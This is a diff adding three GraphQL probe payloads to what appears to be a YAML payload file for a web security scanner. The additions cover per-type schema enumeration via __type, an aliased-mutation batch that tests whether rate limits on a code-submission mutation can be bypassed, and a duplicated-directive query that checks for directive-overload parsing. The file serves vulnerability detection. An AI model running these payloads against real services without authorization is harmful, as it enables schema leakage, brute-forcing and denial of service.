@@ -35,6 +35,18 @@ payloads:
     template: '{__type(name:"{canary}"){name}}'
     confidence: confirmed
     notes: Embeds a {canary} marker the OAST collector correlates if logged.
+  - id: type_field_enum
+    template: "{__type(name:\"User\"){name kind fields{name type{name kind}}}}"
+    confidence: suspected
+    notes: "Targeted __type field enumeration of a single named type; a populated fields array confirms per-type schema leakage even when full __schema introspection is disabled."
+  - id: alias_mutation_brute
+    template: "mutation{a1:submitCode(code:\"{canary}01\"){ status } a2:submitCode(code:\"{canary}02\"){ status } a3:submitCode(code:\"{canary}03\"){ status }}"
+    confidence: suspected
+    notes: "Bounded 3x aliased-mutation batch with distinct {canary}-tagged values; all aliases executing under one rate-limit decrement confirms per-request throttling is bypassable via alias batching."
+  - id: directive_overload
+    template: "{a:__typename @include(if:true) @include(if:true) @include(if:true)}"
+    confidence: suspected
+    notes: "Duplicated non-repeatable @include directives on one field; spec-compliant servers reject with 'can only be used once', so acceptance confirms a non-conformant parser exposed to directive-overload amplification."
 mutations:
   - name: case_flip
     description: GraphQL field names are case-sensitive — flips produce known errors.
